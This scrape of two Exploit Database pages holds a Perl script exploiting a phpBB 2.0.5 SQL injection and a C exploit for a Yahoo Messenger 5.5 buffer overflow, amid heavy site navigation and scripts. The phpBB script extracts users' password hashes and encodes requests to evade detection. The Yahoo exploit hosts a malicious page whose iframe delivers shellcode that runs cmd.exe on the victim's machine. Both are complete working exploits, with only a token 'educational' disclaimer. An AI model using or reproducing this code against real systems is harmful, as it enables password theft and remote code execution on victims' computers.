Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 44
phpBB 2.0.5 - SQL Injection Password Disclosure - PHP webapps Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDphpBB 2.0.5 - SQL Injection Password DisclosureEDB-ID:44CVE:2003-0486EDB Verified:Author:Rick PatelType:webappsExploit:/Platform:PHPDate:2003-06-20Vulnerable App:Become a Certified Penetration TesterEnroll inAdvanced Web Attacks and Exploitation, the courserequired to become anOffensive Security Web Expert (OSWE)GET CERTIFIED#!/usr/bin/perl -w### phpBB password disclosure vuln.# - rick patel## There is a sql injection vuln which exists in /viewtopic.php file. The variable is $topic_id# which gets passed directly to sql server in query. Attacker could pass a special sql string which# can used to see md5 password hash for any user (!) for phpBB. This pass can be later used with# autologin or cracked using john.## Details:## this is checking done for $topic_id in viewtopic.php:## if ( isset($HTTP_GET_VARS[POST_TOPIC_URL]) )# {# $topic_id = intval($HTTP_GET_VARS[POST_TOPIC_URL]);# }# else if ( isset($HTTP_GET_VARS['topic']) )# {# $topic_id = intval($HTTP_GET_VARS['topic']);# }## ok... no else statement at end :)# now if GET[view]=newest and GET[sid] is set, this query gets executed:## $sql = "SELECT p.post_id# FROM " . POSTS_TABLE . " p, " . SESSIONS_TABLE . " s, " . USERS_TABLE . " u# WHERE s.session_id = '$session_id'# AND u.user_id = s.session_user_id# AND p.topic_id = $topic_id# AND p.post_time >= u.user_lastvisit# ORDER BY p.post_time ASC# LIMIT 1";## $topic_id gets passed directy to query. So how can we use this to do something important? Well# I decided to use union and create a second query will get us something useful. There were couple of# problems i ran into. first, phpBB only cares about the first row returned. second, the select for first# query is p.post_id which is int, so int becomes the type returned for any other query in union. third,# there is rest of junk at end " AND p.post_time >= ..." We tell mysql to ignore that by placing /* at end# of our injected query. So what query can we make that returns only int?# this one => select ord(substring(user_password,$index,1)) from phpbb_users where user_id = $uid# Then all we have to do is query 32 times which $index from 1-32 and we get ord value of all chars of# md5 hash password.## I have only tested this with mysql 4 and pgsql . Mysql 3.x does not support unions so you would have to tweak# the query to do anything useful.## This script is for educational purpose only. Please dont use it to do anything else.## To Fix this bug : http://www.phpbb.com/phpBB/viewtopic.php?t=112052use IO::Socket;$remote = shift || 'localhost';$view_topic = shift || '/phpBB2/viewtopic.php';$uid = shift || 2;$port = 80;$dbtype = 'mysql4'; # mysql4 or pgsqlprint "Trying to get password hash for uid $uid server $remote dbtype: $dbtype\n";$p = "";for($index=1; $index<=32; $index++){$socket = IO::Socket::INET->new(PeerAddr => $remote,PeerPort => $port,Proto => "tcp",Type => SOCK_STREAM)or die "Couldnt connect to $remote:$port : $@\n";$str = "GET $view_topic" . "?sid=1&topic_id=-1" . random_encode(make_dbsql()) ."&view=newest" . " HTTP/1.0\n\n";print $socket $str;print $socket "Cookie: phpBB2mysql_sid=1\n"; # replace this for pgsql or remove itprint $socket "Host: $remote\n\n";while ($answer = <$socket>){if ($answer =~ /Location:.*\x23(\d+)/) # Matches the Location: viewtopic.php?p=<num>#<num>{$p .= chr ($1);}}close($socket);}print "\nMD5 Hash for uid $uid is $p\n";# random encode str. helps avoid detectionsub random_encode{$str = shift;$ret = "";for($i=0; $i<length($str); $i++){$c = substr($str,$i,1);$j = rand length($str) * 1000;if (int($j) % 2 || $c eq ' '){$ret .= "%" . sprintf("%x",ord($c));}else{$ret .= $c;}}return $ret;}sub make_dbsql{if ($dbtype eq 'mysql4'){return " union select ord(substring(user_password," . $index . ",1)) from phpbb_users where user_id=$uid/*" ;} elsif ($dbtype eq 'pgsql'){return ";select ascii(substring(user_password from $index for 1)) aspost_id from phpbb_posts p, phpbb_users u where u.user_id=$uid or false";}else{return "";}}# milw0rm.com [2003-06-20]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 45
Yahoo Messenger 5.5 - 'DSR-ducky.c' Remote Overflow - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDYahoo Messenger 5.5 - 'DSR-ducky.c' Remote OverflowEDB-ID:45CVE:2002-0031EDB Verified:Author:RaveType:remoteExploit:/Platform:WindowsDate:2003-06-23Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*** ---[ Remote yahoo Messenger V5.5 exploiter on Windows XP ]---** Dtors Security Research (DSR)* Code by: Rave** The buffer looks like this** |-<-<-<--|* <Fillup x offset><JMP 0x3><EIP><NOPS><SHELLCODE>* ^__________^***/#include <windows.h>#include <stdio.h>#include <stdlib.h>#include <string.h>#include <stdio.h> /* These are the usual header files */#include <winsock2.h>#include <stdio.h>#include <stdlib.h>#define MAXDATASIZE 555 /* Max number of bytes of data */#define BACKLOG 200 /* Number of allowed connections */static int port =80;/* library entry inside msvcrt.dll to jmp 0xc (EB0C); */char sraddress[8]="\x16\xd8\xE8\x77";/* This shellcode just executes cmd.exe nothing special here..* the victim gets a cmd shell on his desktop :) lol ! \*/unsigned char shellcode[] ="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""\x8b\xec\x55\x8b\xec\x68\x65\x78\x65\x20\x68\x63\x6d\x64\x2e\x8d\x45\xf8\x50\xb8""\x44\x80\xbf\x77" // 0x78bf8044 <- adress of system()"\xff\xd0"; // call system()static int port;void Usage(char *programName){printf("\n\t\t---------------------------------------------------\n");printf("\t\t\t\tDtors Security Research (DSR) \n");printf("\t\t\t\tCode by: Rave\n");printf("\t\t\t\tMail: rave@dtors.net\n");printf("\t\t---------------------------------------------------\n\n");/* Modify here to add your usage message when the program is* called without arguments */printf("\t\t---------------------------------------------------\n\n");fprintf(stdout,"\t\t-P local webserver server portnumber\n");fprintf(stdout,"\t\t-g greatz to:\n\n\n\n\n");printf("\t\t---------------------------------------------------\n\n");}/* returns the index of the first argument that is not an option; i.e.does not start with a dash or a slash*/int HandleOptions(int argc,char *argv[]){int i,firstnonoption=0;for (i=1; i< argc;i++) {if (argv[i][0] == '/' || argv[i][0] == '-') {switch (argv[i][1]) {/* An argument -? means help is requested */case '?':Usage(argv[0]);break;case 'P':port=atoi(argv[i+1]);break;case 'H':if (!stricmp(argv[i]+1,"help")) {Usage(argv[0]);break;}/* If the option -h means anything else* in your application add code here* Note: this falls through to the default* to print an "unknow option" message*//* add your option switches here */default:fprintf(stderr,"unknown option %s\n",argv[i]);break;}}else {firstnonoption = i;break;}}return firstnonoption;}int main(int argc,char *argv[]){FILE *fptr;unsigned char buffer[5000];int offset=320; // <-- the offset off the buffer = 320 x NOP; (At 321 whe begin the instruction pointer change)int fd,fd2 ,i,numbytes,sin_size; /* files descriptors */char sd[MAXDATASIZE]; /* sd will store send text */struct sockaddr_in server; /* server's address information */struct sockaddr_in client; /* client's address information */struct hostent *he; /* pointer for the host entry */WSADATA wsdata;WSAStartup(0x0101,&wsdata);if (argc == 1) {/* If no arguments we call the Usage routine and exit */Usage(argv[0]);return 1;}HandleOptions(argc,argv);fprintf(stdout,"Creating index.html: ");if ((fptr =fopen("index.html","w"))==NULL){fprintf(stderr,"Failed\n");exit(1);} else {fprintf(stderr,"Done\n");}// memseting the buffers for preperationmemset(sd,0x00,MAXDATASIZE);memset(buffer,0x00,offset+32+strlen(shellcode));memset(buffer,0x90,offset);// whe place the a jmp ebp+0x3 instuction inside the buffer// to jump over the eip changing bytes at the en offset//// <fillup x offset>jmp 0x3<eip><NOPS><shellcode>// |____________^buffer[offset-4]=0xeb;buffer[offset-3]=0x03;memcpy(buffer+offset,sraddress,4);memcpy(buffer+offset+4,shellcode,strlen(shellcode));// here whe make the index.html// whe open it again if some one connects to the exploiting server// and send it over to the victim.fprintf(fptr,"<!DOCTYPE HTML PUBLIC %c-//W3C//DTD HTML 4.0 Transitional//EN%c>",0x22,0x22);fprintf(fptr,"<html>");fprintf(fptr,"<title>Oohhh my god exploited</title>\n");fprintf(fptr,"<body bgcolor=%cblack%c>",0x22,0x22);fprintf(fptr,"<body>");fprintf(fptr,"<font color=%c#C0C0C0%c size=%c2%c face=%cverdana, arial, helvetica, sans-serif%c>",0x22,0x22,0x22,0x22,0x22,0x22);fprintf(fptr,"<B>Dtors Security Research (DSR)</B>\n");fprintf(fptr,"<p>Yah000 Messager Version 5.5 exploit....</p>\n");fprintf(fptr,"<pre>");fprintf(fptr,"<IFRAME SRC=%cymsgr:call?%s%c>Contach heaven</html></body>\x00\x00\x00",0x22,buffer,0x22);fprintf(fptr,"<IFRAME SRC=%chttp://www.boothill-mc.com/images/skull-modsm_01.gif%c>....</html></body>\x00\x00\x00",0x22,0x22);fclose(fptr); // <-- closing index.html again// Some extra debuging informationfprintf(stdout,"Using port: %d\n",port);fprintf(stdout,"\nStarting server http://localhost:%d: ",port);if ((fd=socket(AF_INET, SOCK_STREAM, 0)) == -1 ){ /* calls socket() */printf("socket() error\n");exit(1);} else {fprintf(stderr,"Done\n");}server.sin_family = AF_INET;server.sin_port = htons(port);server.sin_addr.s_addr = INADDR_ANY; /* INADDR_ANY puts your IP address automatically */memset(server.sin_zero,0,8); /* zero the rest of the structure*/if(bind(fd,(struct sockaddr*)&server,sizeof(struct sockaddr))==-1){/* calls bind() */printf("bind() error\n");exit(-1);}if(listen(fd,BACKLOG) == -1){ /* calls listen() */printf("listen() error\n");exit(-1);}while(1){sin_size=sizeof(struct sockaddr_in);if ((fd2 = accept(fd,(struct sockaddr *)&client,&sin_size))==-1){/* calls accept() */printf("accept() error\n");exit(1);}if ((he=gethostbyname(inet_ntoa(client.sin_addr)))==NULL){printf("gethostbyname() error\n");exit(-1);}printf("You got a connection from %s (%s)\n",inet_ntoa(client.sin_addr),he->h_name);/* prints client's IP */fprintf(stdout,"\nOpening index.html for remote user: ");if ((fptr =fopen("index.html","r"))==NULL){fprintf(stderr,"Failed\n");exit(1);} else {fprintf(stderr,"Done\n");}fprintf(stdout,"Sending the overflow string... ");// reading the index.html file and sending its// contents to the connected victimwhile (!feof(fptr)) {send(fd2,sd,strlen(sd),0);numbytes=fread(sd,sizeof(char),MAXDATASIZE,fptr);sd[numbytes * sizeof(char)]='\0';}send(fd2,sd,strlen(sd),0);printf("\n\n\nExploit Done....\n\n\n");printf("A shell is started @ %s :) lol\n\n\nPress any key to exit the exploit",inet_ntoa(client.sin_addr),he->h_name);gets(sd);exit(0);}return 0;}// milw0rm.com [2003-06-23]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in 